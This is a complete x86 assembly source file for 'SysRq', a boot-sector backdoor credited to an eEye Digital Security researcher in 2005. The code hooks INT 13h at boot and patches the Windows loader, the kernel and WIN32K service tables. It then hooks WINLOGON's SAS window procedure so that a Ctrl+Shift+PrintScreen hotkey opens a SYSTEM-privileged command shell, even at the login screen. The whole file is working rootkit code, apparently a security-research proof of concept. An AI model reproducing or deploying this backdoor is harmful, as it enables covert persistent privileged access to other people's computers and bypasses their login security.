;===============================================================
; SysRq v0.0
;---------------------------------------------------------------
; Custom boot sector code that installs a keystroke backdoor to
; provide a system shell.
;
; Derek Soeder - eEye Digital Security - 07/07/2005
;===============================================================


.486p
.model tiny


BOOTORG EQU 7C00h						; our code is executed by the BIOS at 0000h:7C00h

SYSRQ_SIZE EQU 400h


;----------------
SYSRQ GROUP SYSRQCODE16

ASSUME CS:SYSRQ, DS:SYSRQ, ES:SYSRQ, SS:SYSRQ

SYSRQ_KERNEL_DEST	EQU 0FFDF0800h
SYSRQ_USER_BACKDOOR	EQU (SYSRQ_KERNEL_DEST - 0FFDF0000h + 7FFE0000h)


;----------------
SYSRQCODE16 SEGMENT byte use16

@SYSRQCODE16_START EQU $

;###################################
;##  Boot-Time Installation Code  ##
;###################################

	;
	; Initialization
	;

	cli

	xor		bx, bx
	mov		ss, bx

	mov		ss:[BOOTORG - 2], sp
	mov		sp, (BOOTORG - 2)

	push		ds
	pushad

	mov		ds, bx

	;
	; Reserve 4KB conventional memory for our memory-resident code
	;

	mov		ax, ds:[0413h]				; 0040h:0013h - base memory size in KBs
	and		al, NOT 3				; make sure we get memory on a page boundary
	sub		ax, 4					; allocate 4KB (one page) for our code
	mov		ds:[0413h], ax

	shl		ax, (10-4)				; AX *= 1024 / 16 (convert linear address in KBs to a segment)
	mov		es, ax

	;
	; Copy ourselves to reserved memory and initialize the rest to zeroes
	;

	cld

	mov		si, BOOTORG
	xor		di, di
	mov		cx, SYSRQ_SIZE / 2
	rep movsw

	;
	; Read second sector of our code (for bootable CDs, floppy emulation mode must be specified)
	;

	sti

	mov		ax, 0201h				; AL: number of sectors
	mov		cl, 2					; CH: cylinder; CL: sector and high bits of cylinder
	cdq							; DH: track; DL: drive number
	mov		bh, (200h / 100h)			; ES:BX: destination buffer
	int		13h					; INT 13h/AH=02h: Read sector(s) into memory
	jc		short @NoINT13Hook

	;
	; Install our INT 13h hook
	;

	cli

	mov		eax, ds:[13h*4]
	mov		es:[INT13HANDLER - @SYSRQCODE16_START], eax	; store previous handler

	mov		word ptr ds:[13h*4], (@Int13Hook)	; point INT 13h vector to our hook handler
	mov		ds:[(13h*4) + 2], es

	sti

@NoINT13Hook:

	;
	; Load and execute MBR from first hard drive (do this from resident code)
	;

	push		es
	push		@BootFromHDD
	retf

@BootFromHDD:

	mov		es, dx					; DX = 0 from above

	mov		ax, 0201h				; AL: number of sectors
	dec		cx					; CH: cylinder; CL: sector and high bits of cylinder
	mov		dl, 80h					; DH: head; DL: drive number
	mov		bh, (BOOTORG / 100h)			; ES:BX: destination buffer
	int		13h					; INT 13h/AH=02h: Read sector(s) into memory

	popad
	pop		ds
	pop		sp

	db		0EAh					; JMP FAR 0000h:7C00h
	dw		BOOTORG, 0000h

;##################################
;##  INT 13h Hook Real-Mode ISR  ##
;##################################

@Int13Hook:

	pushf
	cmp		ah, 42h					; IBM/MS INT 13 Extensions - EXTENDED READ
	je		short @Int13Hook_ReadRequest

	cmp		ah, 02h					; DISK - READ SECTOR(S) INTO MEMORY
	je		short @Int13Hook_ReadRequest
	popf

	db		0EAh					; JMP FAR INT13HANDLER
INT13HANDLER EQU $
	dd		?

@Int13Hook_ReadRequest:

	mov		byte ptr cs:[INT13LASTFUNCTION], ah

	;
	; Invoke original handler to perform read operation
	;

	popf
	pushf							; push Flags because we're simulating an INT
	call		dword ptr cs:[INT13HANDLER]		; call original handler
	jc		short @Int13Hook_ret			; abort immediately if read failed

	pushf
	cli
	push		es
	pusha

	;
	; Adjust registers to emulate an AH=02h read if AH=42h was used
	;

	mov		ah, 00h
INT13LASTFUNCTION EQU $-1
	cmp		ah, 42h
	jne		short @Int13Hook_notextread

	lodsw
	lodsw							; 02h  WORD    number of blocks to transfer
	les		bx, [si]				; 04h  DWORD   transfer buffer

@Int13Hook_notextread:

	;
	; Scan sector for a signature of the code we want to modify
	;

	test		al, al
	jle		short @Int13Hook_scan_done

	cld

	mov		cl, al
	mov		al, 8Bh
	shl		cx, 9					; (AL * 200h)
	mov		di, bx

  @Int13Hook_scan_loop:
								; 8B F0       MOV ESI, EAX
								; 85 F6       TEST ESI, ESI
								; 74 21       JZ $+23h
								; 80 3D ...   CMP BYTE PTR [ofs32], imm8
								; (the first 6 bytes of this signature exist in other modules!)
	repne scasb
	jne		short @Int13Hook_scan_done

	cmp		dword ptr es:[di], 74F685F0h
	jne		short @Int13Hook_scan_loop

	cmp		word ptr es:[di+4], 8021h
	jne		short @Int13Hook_scan_loop

	mov		word ptr es:[di-1], 15FFh		; FFh/15h: CALL NEAR [ofs32]

	mov		eax, cs
	shl		eax, 4

	or		cs:[(KEASSTHOOK_PTE - @SYSRQCODE32_START) + SYSRQCODE16_SIZE], eax

	add		ax, (@PatchFunction - @SYSRQCODE32_START) + SYSRQCODE16_SIZE
								; should be okay to add to AX, since we can't cross 1KB boundary
	mov		cs:[(PATCHFUNC32_LINEAR - @SYSRQCODE32_START) + SYSRQCODE16_SIZE], eax

	sub		ax, (@PatchFunction - PATCHFUNC32_LINEAR)
	mov		es:[di+1], eax

@Int13Hook_scan_done:

	popa
	pop		es
	popf

@Int13Hook_ret:

	retf 2							; discard saved Flags from original INT (pass back CF, etc.)

@SYSRQCODE16_END EQU $

SYSRQCODE16_SIZE EQU (@SYSRQCODE16_END - @SYSRQCODE16_START)

SYSRQCODE16 ENDS


;----------------
SYSRQ32 GROUP SYSRQCODE32, SYSRQBACKDOOR

ASSUME CS:SYSRQ32, DS:nothing, ES:nothing, SS:nothing


SYSRQCODE32 SEGMENT byte use32

@SYSRQCODE32_START EQU $

PATCHFUNC32_LINEAR EQU $

	dd		?

;#######################################
;##  Inline Code Patch Hook Function  ##
;#######################################

@PatchFunction:

	;
	; Initialization
	;

	pushfd
	pushad							; assume DS = ES = 10h (KGDT_R0_DATA: flat ring-0 data segment)

	cld

	;
	; Scan for address of module list base (_BlLoaderData)
	;

	mov		edi, [esp+24h]				; use EIP as a ptr into OSLOADER
	and		edi, NOT 000FFFFFh			; convert to image base ptr

	mov		al, 0C7h				; C7h/46h/34h/00h/40h/00h/00h: MOV DWORD PTR [ESI+34h], 4000h

@PatchFunction_mlsigloop:					; assume that we will find it

	scasb
	jne		short @PatchFunction_mlsigloop

	cmp		dword ptr [edi], 40003446h
	jne		short @PatchFunction_mlsigloop

	mov		al, 0A1h				; A1h/xx/xx/xx/xx: MOV EAX, [xxxxxxxx]

@PatchFunction_mlbaseloop:

	scasb
	jne		short @PatchFunction_mlbaseloop

	;
	; Get NTOSKRNL.EXE image base (assume it's the first module in the list)
	;

	mov		esi, [edi]				; ptr to base of module list
	mov		esi, [esi]				; ptr to first node of module list
	lodsd							; ptr to second node (first actual module node)

	mov		ebx, [eax+18h]				; EBX = image base address

	;
	; Hook NTOSKRNL.EXE!KeAddSystemServiceTable
	;

	call		@PatchFunction_overhookfunc


	;#################################################
	;##  NTOSKRNL.EXE!KeAddSystemServiceTable hook  ##
	;#################################################

	;--- begin KeASSTHook code ---

@KeASSTHook:

	sub		dword ptr [esp], 5			; back up return address to beginning of hooked function

	pushad
	mov		eax, 00000001h				; physical addr of our conventional memory | PTE.Present
KEASSTHOOK_PTE EQU $-4
	xor		ecx, ecx
	mov		ch, (SYSRQ_SIZE / 100h)
	mov		edx, 0C0000000h				; ptr to first PTE of 0..4MB-1 page table (assume it's present)
	xor		esi, esi				; we made sure our code starts on a page boundary
	mov		edi, SYSRQ_KERNEL_DEST			; writable kernel mapping of SharedUserData
	xchg		[edx], eax
	wbinvd
	rep movsb
	mov		[edx], eax
	wbinvd

	db 6Ah, 0						; 6Ah/xx: PUSH simm8
KEASSTHOOK_DISPLACED4 EQU $-1
	pushd		0
KEASSTHOOK_DISPLACED0 EQU $-4

	push		(SYSRQ_KERNEL_DEST + SYSRQCODE16_SIZE + (@PatchWIN32K - @SYSRQCODE32_START))
	ret							; jump to @PatchWIN32K

	;--- end of KeASSTHook ---


@PatchFunction_overhookfunc:

	pop		esi					; ptr to @KeASSTHook
	db 6Ah, (@PatchFunction_overhookfunc - @KeASSTHook)	; 6Ah: PUSH simm8 (to keep MASM from being stupid)
	pop		ecx					; size of KeASSTHook code

	lea		edi, [ebx+40h]				; our code will overwrite MZ code at +40h
	mov		ebp, edi				; we'll use this for computing relative CALL offset later
	rep movsb

	mov		edx, 0A21CD4EEh				; 0A21CD4EEh <-- "KeAddSystemServiceTable", 0
	call		@GetExport
	xchg		esi, eax

	sub		edi, (@PatchFunction_overhookfunc - KEASSTHOOK_DISPLACED0)
	movsd
	sub		edi, (KEASSTHOOK_DISPLACED0 + 4 - KEASSTHOOK_DISPLACED4)
	movsb

	mov		byte ptr [esi-5], 0E8h			; E8h/xx/xx/xx/xx: CALL rel
	sub		ebp, esi
	mov		dword ptr [esi-4], ebp

	mov		word ptr ds:[000B8000h], 0902h		;***

@PatchFunction_done:

	;
	; Restore registers, perform displaced instructions, and return into patched code
	;

	popad
	popfd

	mov		esi, eax
	test		eax, eax
	jnz		short @PatchFunction_done_nojz
	pushfd
	add		dword ptr [esp+4], 21h
	popfd
@PatchFunction_done_nojz:
	ret

;#################################################
;##  Second-stage KeAddSystemServiceTable hook  ##
;#################################################

@PatchWIN32K:

	;
	; Unhook NTOSKRNL.EXE!KeAddSystemServiceTable
	;

	mov		ebp, esp				; so we don't have to use SIB bytes in the following instructions
	mov		edi, [ebp+8+20h]			; ptr to KeAddSystemServiceTable function entry point

	mov		ecx, cr0
	mov		edx, ecx
	and		ecx, NOT 00010000h
	mov		cr0, ecx				; disable CR0.WP (page R/W enforcement from supervisor code)

	pop		eax					; restore displaced function prolog code
	stosd
	pop		eax
	stosb

	mov		cr0, edx				; restore CR0.WP to its original setting

	;
	; Search WIN32K.SYS!_W32pServiceTable and _W32pArgumentTable for WIN32K.SYS!NtUserRegisterHotKey
	;

	mov		esi, [ebp+8+28h]			; ptr to Service Descriptor Table (_W32pServiceTable)
	mov		ecx, [ebp+8+30h]			; number of services
	mov		edi, [ebp+8+34h]			; ptr to argument count list (_W32pArgumentTable)

@PatchWIN32K_nturhkloop:

	lodsd

	cmp		byte ptr [edi], 10h			; NtUserRegisterHotKey has 4 arguments
	jne		short @PatchWIN32K_nturhkloop_next

	push		20h
	pop		edx

  @PatchWIN32K_nturhkloop_testloop:

	cmp		byte ptr [eax], 0F7h			; F7h/0: TEST mem, imm
	jne		@PatchWIN32K_nturhkloop_testloop_next

	push		4
	pop		ebx

    @PatchWIN32K_nturhkloop_testloop_immloop:

	cmp		dword ptr [eax+ebx], 0FFFF7FF0h		; search EAX+4..1 for bit mask of prohibited 'fsModifiers' flags
	je		@PatchWIN32K_found			;   (EAX+1 case isn't a proper match, but we save a byte this way)

	dec		ebx
	jnz		@PatchWIN32K_nturhkloop_testloop_immloop

    @PatchWIN32K_nturhkloop_testloop_next:

	inc		eax
	dec		edx
	jnz		short @PatchWIN32K_nturhkloop_testloop

  @PatchWIN32K_nturhkloop_next:

	inc		edi
	loop		@PatchWIN32K_nturhkloop

	popad
	ret							; restart KeAddSystemServiceTable

	;
	; Scan backwards (assume reverse alphabetical order) for NtUserRegisterClassExWOW
	;

@PatchWIN32K_found:

	inc		edi

@PatchWIN32K_nturcewowloop:

	sub		esi, 4
	dec		edi
	cmp		byte ptr [edi], 18h			; NtUserRegisterClassExWOW will have 6 or 7 arguments
	jb		@PatchWIN32K_nturcewowloop

	;
	; Replace NtUserRegisterClassExWOW SDT entry and store original
	;

	mov		eax, [esi]
	mov		edi, (SYSRQ_KERNEL_DEST + 200h + (@NtUserRegisterClassExWOWHook - @SYSRQBACKDOOR_START))
	mov		[edi + (NTURCEWOWHOOK_ORIGINAL - @NtUserRegisterClassExWOWHook)], eax
	mov		[esi], edi

	popad
	ret							; restart KeAddSystemServiceTable

@SYSRQCODE32_END EQU $

SYSRQCODE32_SIZE EQU (@SYSRQCODE32_END - @SYSRQCODE32_START)

SYSRQCODE32 ENDS


;----------------
SIGNATURE SEGMENT BYTE

ORG (200h - 2) - SYSRQCODE16_SIZE - SYSRQCODE32_SIZE

	dw		0AA55h

SIGNATURE ENDS


;----------------
SYSRQBACKDOOR SEGMENT byte use32

@SYSRQBACKDOOR_START EQU $

;################################################
;##  WIN32K.SYS!NtUserRegisterClassExWOW hook  ##
;################################################

@NtUserRegisterClassExWOWHook:

	;
	; Initialization
	;

	pushad

	xor		eax, eax

	push		(SYSRQ_KERNEL_DEST + 200h + (@NtUserRegisterClassExWOWHook_seh - @SYSRQBACKDOOR_START))
	push		dword ptr fs:[eax]			; create our exception registration on the stack
	mov		dword ptr fs:[eax], esp			; install our exception handler

	;
	; Validate arguments and check class name
	;

	mov		ebp, ds:[7FFE02B4h]			; EBP = MmHighestUserAddress

	mov		edx, [esp+8+28h]			; PUNICODE_STRING for class name
	cmp		edx, ebp
	ja		short @NtUserRegisterClassExWOWHook_done

	cmp		word ptr [edx], 16*2			; size of L"SAS window class" excluding null terminator
	jne		short @NtUserRegisterClassExWOWHook_done

	mov		esi, [edx+4]
	cmp		esi, ebp
	ja		short @NtUserRegisterClassExWOWHook_done

	push		16
	pop		ecx
	mov		edx, 72ABEC2Dh				; 72ABEC2Dh <-- "SAS window class"

@NtUserRegisterClassExWOWHook_hashloop:

	lodsw
	sub		edx, eax
	ror		edx, 7
	loop		@NtUserRegisterClassExWOWHook_hashloop

	test		edx, edx
	jnz		short @NtUserRegisterClassExWOWHook_done

	;
	; Replace window procedure and store previous in PEB
	;

	mov		esi, [esp+8+24h]			; ptr to class struct (WNDCLASSEXW?)
	cmp		esi, ebp
	ja		short @NtUserRegisterClassExWOWHook_done

	mov		ecx, fs:[edx+18h]			; ptr to user TIB
	mov		ecx, [ecx+30h]				; ptr to PEB
	cmp		ecx, ebp
	ja		short @NtUserRegisterClassExWOWHook_done

	mov		eax, (SYSRQ_USER_BACKDOOR + 200h + (@SASWndProcHook - @SYSRQBACKDOOR_START))
	xchg		dword ptr [esi+8], eax			; replace 'lpfnWndProc' with our own window proc

	mov		[ecx+0EB0h], eax			; PEB->0EB0h = old 'lpfnWndProc' (should be SASWndProc)

@NtUserRegisterClassExWOWHook_done:

	xor		eax, eax
	pop		dword ptr fs:[eax]			; remove our exception registration from list
	pop		ecx					; remove 'handler' field of exception registration
	popad

	pushd		0
NTURCEWOWHOOK_ORIGINAL EQU $-4
	ret

@NtUserRegisterClassExWOWHook_seh:

	xor		eax, eax				; ExceptionContinueExecution return value

	cdq
	mov		dl, 0B8h
	add		edx, [esp+0Ch]				; Context
								; Context->Eip
	mov		dword ptr [edx], (SYSRQ_KERNEL_DEST + 200h + (@NtUserRegisterClassExWOWHook_done - @SYSRQBACKDOOR_START))
	ret

;###########################
;##  Auxiliary Functions  ##
;###########################

	;
	; Scans backwards from a pointer to determine the encompassing image's base address.
	;
	; Parameters:	EAX = ptr into module
	;
	; Returns:	EAX = module image base
	;		EDX = ptr to PE header
	;		(ECX destroyed)
	;

@GetImageBase:

	mov		ecx, 00000FFFh				; 4KB-1
	or		eax, ecx
	inc		ecx					; ECX = 00001000h
	inc		eax					; advance EAX to next 4KB multiple

@GetImageBase_mzloop:

	sub		eax, ecx				; back up 4KB
	cmp		word ptr [eax], 5A4Dh			; "MZ"
	jne		short @GetImageBase_mzloop

	mov		edx, [eax+3Ch]
	cmp		edx, 40h
	jb		short @GetImageBase_mzloop
	cmp		edx, ecx
	jae		short @GetImageBase_mzloop

	add		edx, eax
	cmp		dword ptr [edx], 00004550h
	jne		short @GetImageBase_mzloop

	ret

	;
	; Retrieves a pointer to the specified DLL export
	;
	; Parameters:	EDX = function name hash
	;		EBX = image base address
	;
	; Returns:	EAX = ptr to export, or 0 if not found

@GetExport:

	xor		eax, eax
	pushad

	mov		ecx, [ebx+3Ch]				; RVA of PE header
	mov		ebp, [ebx+ecx+78h]			; RVA of export directory
	add		ebp, ebx				; ptr to export directory

	mov		ecx, [ebp+18h]				; IMAGE_EXPORT_DIRECTORY::NumberOfNames
	mov		edi, [ebp+20h]				; IMAGE_EXPORT_DIRECTORY::AddressOfNames
	add		edi, ebx

	jecxz		@GetExport_done

@GetExport_nameloop:

	mov		esi, [edi]
	add		esi, ebx
	scasd							; advance EDI by 4, to next name RVA in array

	push		edx

  @GetExport_nameloop_hashloop:

	lodsb
	sub		edx, eax
	ror		edx, 7
	test		eax, eax
	jnz		short @GetExport_nameloop_hashloop

	test		edx, edx
	pop		edx
	loopnz		@GetExport_nameloop

	jnz		short @GetExport_done

	not		ecx					; ~ECX = -(ECX+1), undoes decrement from LOOPNZ
	mov		edx, [ebp+24h]				; IMAGE_EXPORT_DIRECTORY::AddressOfNameOrdinals
	add		ecx, [ebp+18h]				; IMAGE_EXPORT_DIRECTORY::NumberOfNames
	add		edx, ebx
	mov		ax, [edx+ecx*2]

	mov		ecx, [ebp+1Ch]				; IMAGE_EXPORT_DIRECTORY::AddressOfFunctions
	add		ecx, ebx
	add		ebx, [ecx+eax*4]

	mov		[esp+1Ch], ebx				; overwrite saved EAX with ptr to export	

@GetExport_done:

	popad
	ret

;####################################
;##  WINLOGON.EXE!SASWndProc hook  ##
;####################################

@SASWndProcHook:

	push		eax					; placeholder for original SASWndProc address so we can POPAD/RET
	pushad

	mov		edi, SYSRQ_USER_BACKDOOR + 200h + (@GetExport - @SYSRQBACKDOOR_START)

	xor		eax, eax
	mov		edx, fs:[eax+30h]			; ptr to PEB
	mov		eax, [edx+2Ch]				; ptr User32DispatchRoutine array

	mov		edx, [edx+0EB0h]			; original SASWndProc address
	mov		[esp+20h], edx

	call		@GetImageBase
	xchg		ebx, eax				; EBX = USER32 image base

	mov		eax, [esp+2Ch]				; get 'uMsg' argument
	cmp		eax, 0001h				; WM_CREATE
	jne		@SASWndProcHook_not_WM_CREATE

	;
	; Register our own hotkey
	;

	push		2Ch			; RegisterHotKey: vk = VK_SNAPSHOT
	push		0006h			; RegisterHotKey: fsModifiers = MOD_CONTROL|MOD_SHIFT
	push		65h			; RegisterHotKey: id
	push		dword ptr [esp+0Ch+28h]	; RegisterHotKey: hwnd

	mov		edx, 0D47907B4h				; 0D47907B4h <-- "RegisterHotKey", 0
	call		edi					; CALL @GetExport
	call		eax			; RegisterHotKey

;----
@SASWndProcHook_done:

	popad
	ret							; invoke original SASWndProc
;----

@SASWndProcHook_not_WM_CREATE:

	cmp		eax, 0312h				; WM_HOTKEY
	jne		@SASWndProcHook_done

	cmp		dword ptr [esp+30h], 65h		; 'idHotKey' ('wParam') == 65h?
	jne		@SASWndProcHook_done

	;
	; Open a command shell
	;

	cdq

	;--- push CreateProcessA arguments and argument data
	push		00646D63h				; "cmd", 0
	mov		ebp, esp				; point EBP here so we can easily restore stack with LEAVE

	push		(10h + 44h + 40h) / 4
	pop		ecx

@SASWndProc_pushloop:
	push		edx
	loop		@SASWndProc_pushloop

	lea		esi, [esp+10h]				; ptr to STARTUPINFO structure
	mov		byte ptr [esi], 44h			; STARTUPINFO::cb

	push		esp			; CreateProcessA: lpProcessInformation
	push		esi			; CreateProcessA: lpStartupInfo

	push		edx			; CreateProcessA: lpCurrentDirectory
	push		edx			; CreateProcessA: lpEnvironment
	push		edx			; CreateProcessA: dwCreationFlags
	push		edx			; CreateProcessA: bInheritHandles
	push		edx			; CreateProcessA: lpThreadAttributes
	push		edx			; CreateProcessA: lpProcessAttributes
	push		ebp			; CreateProcessA: lpCommandLine
	push		edx			; CreateProcessA: lpApplicationName

	;--- retrieve window station and desktop names
	add		esi, 44h				; ptr to buffer for "WinSta\Desktop"
	mov		[esi-44h+8], esi			; STARTUPINFO::lpDesktop

	mov		edx, 7AA88699h				; 7AA88699h <-- "GetProcessWindowStation", 0
	call		edi					; CALL @GetExport
	call		eax			; GetProcessWindowStation

	push		ecx					; var to receive length of returned data
	push		esp			; GetUserObjectInformationA: lpnLengthNeeded
	push		40h			; GetUserObjectInformationA: nLength
	push		esi			; GetUserObjectInformationA: pvInfo
	push		2			; GetUserObjectInformationA: nIndex = UOI_NAME
	push		eax			; GetUserObjectInformationA: hObj
	mov		edx, 2568D33Fh				; 2568D33Fh <-- "GetUserObjectInformationA", 0
	call		edi					; CALL @GetExport
	call		eax			; GetUserObjectInformationA
	test		eax, eax
	jz		@SASWndProc_hotkeyabort

	xor		eax, eax
	push		eax			; OpenInputDesktop: dwDesiredAccess = 0
	push		eax			; OpenInputDesktop: fInherit = FALSE
	push		eax			; OpenInputDesktop: dwFlags = 0
	mov		edx, 0B98496E5h				; 0B98496E5h <-- "OpenInputDesktop", 0
	call		edi					; CALL @GetExport
	call		eax			; OpenInputDesktop

	pop		ecx
	push		eax			; CloseDesktop: hDesktop
	push		ecx					; var to receive length of returned data
	add		esi, ecx				; now ESI points to where desktop name belongs
	mov		byte ptr [esi-1], '\'			;   (returned count includes null terminator)

	push		esp			; GetUserObjectInformationA: lpnLengthNeeded
	sub		ecx, 40h
	neg		ecx
	push		ecx			; GetUserObjectInformationA: nLength
	push		esi			; GetUserObjectInformationA: pvInfo
	push		2			; GetUserObjectInformationA: nIndex = UOI_NAME
	push		eax			; GetUserObjectInformationA: hObj
	mov		edx, 2568D33Fh				; 2568D33Fh <-- "GetUserObjectInformationA", 0
	call		edi					; CALL @GetExport
	call		eax			; GetUserObjectInformationA
	pop		ecx					; free returned data length var

	push		eax					; save result so we can still abort after CloseDesktop call
	mov		edx, 0CA71A863h				; 0CA71A863h <-- "CloseDesktop", 0
	call		edi					; CALL @GetExport
	pop		ebx					; we're done with EBX, and its value will persist across call
	call		eax			; CloseDesktop

	test		ebx, ebx
	jz		@SASWndProc_hotkeyabort

	;--- get KERNEL32 image base
	xor		eax, eax
	mov		eax, fs:[eax+30h]			; ptr to PEB
	mov		eax, [eax+0Ch]				; ptr to loader data
	mov		ecx, [eax+1Ch]				; ptr to first module in initialization-order list

@SASWndProc_iomlloop:

	mov		ebx, [ecx+8]				; module image base
	mov		esi, [ecx+20h]				; ptr to module file name
	mov		ecx, [ecx]				; ptr to next module
	lodsb
	or		al, 20h
	cmp		al, 'k'					; assume KERNEL32.DLL will be first module starting with 'K'
	jne		@SASWndProc_iomlloop

	;--- call CreateProcessA
	mov		edx, 4B5D35E6h				; 4B5D35E6h <-- "CreateProcessA", 0
	call		edi					; CALL @GetExport
	call		eax			; CreateProcessA

@SASWndProc_hotkeyabort:

	leave							; restore ESP to EBP, then pop EBP to remove last item

	popad
	pop		eax					; trash SASWndProc "return address" set up on stack
	xor		eax, eax
	ret							; return directly instead of invoking original SASWndProc


@SYSRQBACKDOOR_END EQU $

SYSRQBACKDOOR_SIZE EQU (@SYSRQBACKDOOR_END - @SYSRQBACKDOOR_START)

SYSRQBACKDOOR ENDS


;----------------
PADDING SEGMENT BYTE

ORG (200h - 1) - SYSRQBACKDOOR_SIZE

	db		0

PADDING ENDS


END
